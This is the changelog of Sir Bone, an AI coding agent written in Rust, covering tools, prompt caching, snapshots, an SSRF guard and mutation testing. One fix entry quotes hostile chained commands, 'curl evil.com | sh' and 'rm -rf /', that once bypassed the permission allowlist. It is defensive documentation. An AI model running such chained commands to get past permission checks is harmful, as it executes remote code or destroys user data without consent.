# Changelog

All notable changes to this project are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

<!-- A detailed development diary lives in CRONOLOGIA.md (not published). -->

## [Unreleased]

### Added

- **Deterministic claim grounding** — `sirbone ground <file>` (or no-arg = the
  latest session's final answer) checks a plan/doc's claims about the codebase
  (paths / symbols / counts) against the actual code with **no model in the
  loop**, prints the verified facts, and exits non-zero on a divergence (a path
  that doesn't exist, a wrong count) so it can gate CI. `SIRBONE_GROUND=1` prints
  the same report after a one-shot run. Engine: `src/agent/grounding.rs`; also
  front-loads the real location+signature of the entities the prompt names into
  the initial context (`prompt_context`) for a more linear run.
- **`verify` tool (LLM-callable) + `/verify` `/oracle` `/plan` slash commands**.
  `verify` runs the project's configured test command (`oracle.test_command`) on
  demand and reports pass/fail with the failing lines hoisted, so the model
  self-checks before finishing. `/plan` is a REPL toggle that asks the model to
  record a SPEC (Goal / Files / Steps / Risks) before editing; `/oracle` toggles
  the post-Done test gate.
- **Token-usage accounting** (`SIRBONE_USAGE=1`). At the end of a one-shot run
  sirbone prints `[usage] calls=N input_tokens=… cached_tokens=… peak_context=…`,
  summing the real per-call prompt size across the agentic loop. Fixes zero
  counts on Anthropic-compatible endpoints (z.ai) that report usage in the final
  `message_delta` rather than `message_start`.
- **Prompt-cache visibility on both providers**. `ContextUsage` now carries
  `cached_tokens`; the TUI info bar shows the cache-hit share (`⚡N%`) next to
  the context gauge. Anthropic reports `cache_read_input_tokens` (and
  `used_tokens` is now the full prompt: uncached + cache read/write, not just
  the uncached remainder); the OpenAI-compatible client requests
  `stream_options.include_usage` and reads
  `prompt_tokens_details.cached_tokens` (OpenAI-style caching is automatic
  server-side — this is the only visibility into it).
### Changed

- **Plan and Oracle are now tools + slash commands, not CLI flags.** The
  `--plan`/`--oracle` flags and the interactive plan-approval gate are gone;
  planning and verification are driven by the `plan`/`verify` tools and the
  `/plan` `/oracle` `/verify` slash commands instead. The Oracle post-Done test
  gate (retry loop + rollback-on-regression) is unchanged and runs whenever
  `oracle.test_command` is configured; `/oracle` toggles it at runtime.

### Removed

- **`--plan` and `--oracle` CLI flags** (replaced by tools + slash commands).
- **7 low-ROI tools** — `find`, `ls`, `sed`, `wait`, `plan`, `fetch_docs`,
  `save_skill`. Subsumed by `bash`+core or unused (decided by a real
  usage-frequency scan, not by eye); fewer always-on tools = less model
  confusion. Registry ~22 → ~15.
- **`SIRBONE_VERIFY`** (LLM claim-auditor pass) — superseded by the deterministic
  `sirbone ground` / `SIRBONE_GROUND` (no second model, can't itself hallucinate).

### Fixed

- **Command-injection bypass in the permission allowlist** (`src/permissions.rs`).
  Allow globs and the safe-readonly check matched the raw command string, so
  `git status; curl evil.com | sh` rode in on `Bash(git status*)` and
  `git status; rm -rf /` passed as read-only. Bash commands are now split on
  chaining operators (quote-aware); every segment must pass the allow list on
  its own, and substitution constructs (`$(…)`, backticks, `<(…)`) never
  auto-allow. `soft_deny` fires on any matching segment.

### Changed

- **Conversation history is now prompt-cached** (`src/ai/anthropic.rs`). A
  `cache_control` breakpoint on the final message block lets each request
  reuse the previous turn's prefix (~0.1× input price); previously only
  system+tools were cached and the whole history was re-read at full price
  every turn.
- **Compaction summary preserves intent** (`src/agent.rs`). The summarizer
  prompt grows from 4 to 8 sections: ordered user requests with
  security-relevant constraints kept verbatim, errors and fixes, failed
  approaches, and a next step anchored to a verbatim quote — so compaction no
  longer drops corrections, constraints, or dead ends.
- **Denied tool calls now carry recovery guidance** (`src/agent.rs`). The
  blocked tool result tells the model to pursue the goal another legitimate
  way without working around the denial, or stop and ask.

- **Prompt hardening** (`src/tools/*.rs`, `src/main.rs`). Tool descriptions for
  `bash`, `read`, `write`, `edit`, `grep` and `glob` now carry usage guidance
  adapted from Claude Code's prompt catalog (fresh shell per bash call — use
  absolute paths and `&&`; prefer dedicated tools over cat/grep/find/sed via
  bash; no destructive git ops or `--no-verify`; read before edit/overwrite).
  The system prompt gains three behavioral guardrails (no unnecessary
  additions, outcome-first concise replies, truthful reporting with
  `file:line` code references) — deliberately capped at three, since
  instruction-following degrades as rule count grows.

### Added

- **Workspace snapshots + `/rollback`** (`src/snapshot.rs`). A shadow git repo
  under `~/.sirbone/projects/<slug>/snapshots.git` (the user's own `.git` is
  never touched; non-git projects work too) commits the whole work-tree once
  per agent run, lazily before the first mutating tool call — covering bash
  side effects the per-file `undo` tool can't see. `/rollback` (REPL + TUI)
  lists snapshots and restores one (`read-tree` + `checkout-index` + `clean`,
  so files created after the snapshot are removed); a safety snapshot first
  makes every rollback itself reversible. Disable: `SIRBONE_NO_SNAPSHOT=1`.
- **Post-edit auto-checks** (`src/checks.rs`). Config key `post_edit_check`
  (`~/.sirbone/config.json`) maps path globs to fast lint commands, e.g.
  `{"*.rs": "cargo check -q --message-format=short"}`. After a mutating tool
  batch, matching commands run once (deduplicated, 30s timeout) and failures
  ride the last tool result inline — the model fixes breakage in the same turn
  instead of discovering it edits later. Advisory: never reverts, never blocks;
  no config = no checks.
- **Trajectory metrics + pass^k in the eval harness** (`bench/eval_harness/`).
  `agentic_cost.py` now extracts two deterministic trajectory signals from
  transcripts — loop detection (≥3 consecutive identical tool calls with the
  same result head) and repro-before-edit (did bash run before the first
  mutation) — both advisory, folded into `eval_*.json` by `run_eval.py`.
  `report.py` prints pass^k vs pass@k over the per-seed flips (the consistency
  gap = share of instances solved inconsistently across seeds). Unit tests in
  `test_agentic_cost.py`.
- **SSRF guard on `web_fetch`** (`src/tools/web_fetch.rs`). URLs are vetted before
  curl runs: http/https only (`--proto =http,https`), private/internal addresses
  rejected (loopback, RFC1918, link-local incl. 169.254.169.254 cloud metadata,
  unspecified, multicast, IPv6 ULA/link-local, v4-mapped), and domain names are
  DNS-resolved with the vetted IP pinned via `--resolve` to block rebinding.
  Escape hatch for local dev servers: `SIRBONE_WEB_FETCH_ALLOW_PRIVATE=1`.
- **Secret redaction in logs** (`src/ai/mod.rs`). `redact_secrets` replaces known
  API key/token values (from `ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_API_KEY`,
  `OPENAI_API_KEY`, `SIRBONE_ARCHITECT_API_KEY`) with `[redacted]` in retry
  warnings, API error bodies, and the OpenAI error event.
- **Fuzzy edit matching** (`src/tools/edit.rs`). `edit` now falls back from exact
  substring match to whitespace-tolerant line matching: first ignoring trailing
  whitespace, then leading+trailing (re-indenting the replacement to the file's
  indentation). Each pass still requires a unique match; ambiguity and not-found
  remain errors.
- **Compaction persisted to sessions** (`src/session.rs`, `src/agent.rs`,
  `src/types.rs`). `compact()` emits `AgentEvent::Compacted` with the post-
  compaction transcript; CLI and TUI append it as a `SessionEntry::Compaction`
  checkpoint, and `session::collapse` rebuilds the compacted transcript on
  load/resume instead of replaying the full raw history.

### Changed

- **No `unwrap()` outside tests.** All 20 non-test `unwrap`/`expect` sites were
  removed or justified: lock acquisitions now go through poison-recovering
  helpers (`lock_or_recover`/`read_or_recover`/`write_or_recover` in
  `src/types.rs` — a poisoned lock yields its data instead of cascading the
  panic), guard-protected unwraps became `let-else`/`if let` flows (`undo.rs`
  pop, `/model` prefix parse, architect key), and `main()` setup errors
  propagate with `?` + context. The two remaining `expect`s are compile-time
  static regexes in `structure.rs` with messages naming the invariant.

### Fixed

- **Slice panic after mid-run compaction.** Both the CLI and TUI persisted new
  messages with `&messages[n_before..]`; compaction shrinks the transcript below
  `n_before`, panicking the writer. Persistence now starts from the compaction
  checkpoint when one occurred (`get(..).unwrap_or(&[])` either way).

- **OpenAI client mutation-tested 38% → 83%** (`src/ai/client.rs`; 5 tests). New
  `httpmock` tests assert that `run_turn` sends the conversation, tools, and model
  in the request, parses streamed text + tool-call deltas, and does not retry a
  4xx; plus `list_models` parsing and `set_model` propagation. Remaining survivors
  are the retry-loop timing boundary and the network-error `is_retryable` arm
  (need real connection failures / multi-second sleeps) — documented debt.
- **`truncate_output` mutation-tested 66% → 100%** (`src/tools/truncate.rs`; 3
  tests). Exact head/tail/omitted-line accounting at chosen line/byte budgets
  pins the budget arithmetic (the `/2` split, `bytes + len + 1` accumulation, the
  `>` byte check) that the property tests left unpinned.
- **Anthropic client mutation-tested 28% → ~89%** (`src/ai/anthropic.rs`; 13 new
  tests). In-module tests pin the request mapping `to_anthropic_request` (roles,
  image/text/thinking/tool blocks, text-collapse, cached system + tools, thinking
  budget), the `handle_event` SSE arms, the runtime model/thinking-budget
  accessors, and each terminal/retryable branch of `stream_error_retryable`. New
  `httpmock` tests cover `list_models`, `count_tokens`, model-switch propagation,
  and a strengthened over-cap retry assertion (`after 1 attempts`). Remaining
  survivors are the retry-loop timing boundaries (need real network failures or
  multi-second backoff sleeps) and a debug-log guard (excluded as
  observability-only in `.cargo/mutants.toml`).
- **Agent-loop logic now mutation-tested to 100%** (`src/agent.rs`: 43% → 100%
  mutation score; 14 new tests). A crate-wide `cargo-mutants` audit found the
  agent loop's core logic largely unpinned — 40 surviving mutants. Added targeted
  tests for `estimate_context_tokens` (exact per-block accounting), `compact`
  (window boundary, prior-summary chaining, file-grounding + long-result
  truncation via a capturing client), `decide` (permission routing), `localize`,
  `nudge_if_stuck`, `switch_model`, and the `LlmClient` default methods. 0
  surviving mutants remain.
- **Property-based tests (`proptest`) for the pure parsers.** Generated-input
  coverage for `glob_matches` (star/literal/prefix/suffix/`a*b` invariants),
  `truncate_output` (passthrough within budget, truncation marker on overflow,
  never panics / never empties non-empty input), and `Message` serde round-trip +
  `extract_text` (concatenates only `Text` blocks, in order). Thousands of cases
  per property, in-module so private fns stay reachable.
- **Wire-level HTTP tests for the Anthropic client** (`tests/anthropic_http.rs`,
  via `httpmock`). The SSE streaming parser, tool-call accumulation from
  `partial_json`, multi-block index ordering, and the terminal error paths
  (stream `error` event, over-cap `retry-after`, non-2xx) were previously covered
  only by pure-helper unit tests — the most intricate code in the crate had no
  end-to-end coverage. 7 tests, all fast (no backoff sleeps).
- **Mutation-testing gate** (`.cargo/mutants.toml` + CI). The per-PR `cargo-mutants`
  job is now a **hard gate** on changed lines (was non-blocking): a surviving
  mutant on a diffed `src/` line fails the build. Config scopes mutation to
  `src/**` and documents one known-equivalent mutant. Run locally with
  `cargo mutants --in-place`.

### Fixed

- **Test-reliability gap in `permissions.rs` closed.** `cargo-mutants` flagged a
  surviving mutant: `PermissionConfig::load()` was never exercised against a real
  config file (tests only built configs in memory). Added a test that points
  `HOME` at a temp `~/.sirbone/config.json` and asserts the parsed allow/soft-deny
  rules — the file's only real test gap (the other flagged mutant is equivalent).
- **CI `cargo-deny` job unblocked.** Two unmaintained-only advisories with no safe
  upgrade now ignored in `deny.toml` with justification: `bincode 1.3.3`
  (RUSTSEC-2025-0141 — maintainer declares 1.x complete; used only for the local
  structure cache) and `paste 1.0.15` (RUSTSEC-2024-0436 — transitive via ratatui,
  no upstream fix). Neither is a vulnerability or reachable by untrusted input.

### Changed

- **OpenAI client retry hardening.** Replaced fragile substring matching on error
  text (`msg.contains("429")` …) with structured classification on the typed
  `OpenAIError` (network connect/timeout, 429, and 5xx retry; auth/bad-request are
  terminal). Retry backoff is now cancellable (Ctrl-C during the wait ends cleanly)
  and uses the same capped exponential schedule and `MAX_ATTEMPTS=5` as the
  Anthropic client. Added unit tests for the classifier and backoff.
- **Dropped unused dependencies** `thiserror` and `tokio-stream` from `Cargo.toml`
  (verified unreferenced via `cargo machete`).

- **Eval harness migrated from SWE-bench Lite to Aider polyglot.** Removed the
  SWE-bench code, data, and out-of-tree target repos; salvaged the
  benchmark-agnostic pieces (`report.py` gate, `composite.py`, `judge.py`,
  `rubric.yaml`). New `aider_dataset.py` / `run_inference_aider.py` /
  `verifiable_aider.py` run the agent **inside** an all-6-toolchain Docker image
  (`bench/eval_harness/docker/`) so it can self-test on every language. Layer-A
  runner validated on all 6 languages (reference solutions pass); agent path
  validated end-to-end on cpp/go/java/js/python/rust (6/6). See
  `docs/AIDER_HARNESS.md`; method unchanged (`docs/EVAL_HARNESS_PLAN.md`).
- **Agentic-cost gate axis** (`agentic_cost.py`, auto-added to `eval_*.json`; gated
  in `report.py`): mean tool-calls/exercise mined from transcripts. The right-axis
  signal for sirbone's tool/prompt/loop changes — sensitive where pass-rate
  saturates (hard subset costs more at equal pass-rate; failures cost 3–4×).
  `report.py` now gates on TWO bands: Layer-A resolved-rate (lower) and agentic
  cost (upper); RED if either trips. Resumable, quota-aware inference (stops
  cleanly on a real 429, resumes from the same `--out`).

### Added

- **Retry-loop breaker** — the agent loop now detects when the same failing tool call is
  repeated 3 times in a row (same tool + same arguments) and appends a one-shot
  strategy-change nudge to the last tool result, steering the model out of the "rabbit
  hole" instead of burning turns on an identical command.
- **Per-language debugging cheat-sheet** in the system prompt — gated to the languages
  actually present in the workspace, steering the model toward non-interactive/batch-mode
  debugging (the only kind the one-shot `bash` tool supports) and away from blocking
  interactive REPLs/watchers.

## [0.1.0] - 2026-06-05

Initial public release. Sir Bone is a from-scratch AI coding agent in Rust: it streams
LLM responses, executes tools, and renders output in REPL or TUI mode.

### Added

- **Agent loop** — explicit `Idle → ToolCalling → Idle → Done` state machine with parallel
  tool execution (`buffer_unordered`) and real context compaction at 87.5% of the window.
- **Providers** — `LlmClient` trait with Anthropic (SSE streaming, prompt caching, extended
  thinking) and OpenAI-compatible (`async-openai`) backends; auto-detected from env vars.
  Resilient send+stream retry with backoff and unit-tested error classification.
- **Tools** — bash, read, write, edit, sed, grep, glob, find, ls, web_fetch, web_search,
  load_skill, wait, note, undo, plus output truncation.
- **MCP** — generic stdio client that spawns servers from `~/.sirbone/config.json` and
  registers each remote tool as `mcp__<server>__<tool>`.
- **Permission pipeline** — allow/soft-deny globs + destructive-pattern detection + an LLM
  classifier for ambiguous bash commands, configurable via `~/.sirbone/config.json`.
- **TUI** (ratatui) — markdown/diff/table/mermaid rendering, braille boar animation,
  6 palettes, settings screen, append-only JSONL sessions with resume.
- **CLI/UX** — `--version`, rich `--help` (`long_about` + examples), shell completions
  (`--completions <SHELL>`), man page (`--man`), `--image` multimodal input, and a clear
  first-run message when no API key is set.
- **Packaging** — dual `MIT OR Apache-2.0` license + `NOTICE` crediting upstream
  [Pi](https://github.com/earendil-works/pi); complete `[package]` metadata with
  `rust-version = "1.88"` (verified MSRV).
- **CI** — `clippy -D warnings` + `test` + `build --release` + an MSRV build job +
  `cargo-deny` (licenses, advisories, bans, sources).

[Unreleased]: https://github.com/automataIA/sir-bone-rs/compare/v0.1.0...HEAD
[0.1.0]: https://github.com/automataIA/sir-bone-rs/releases/tag/v0.1.0
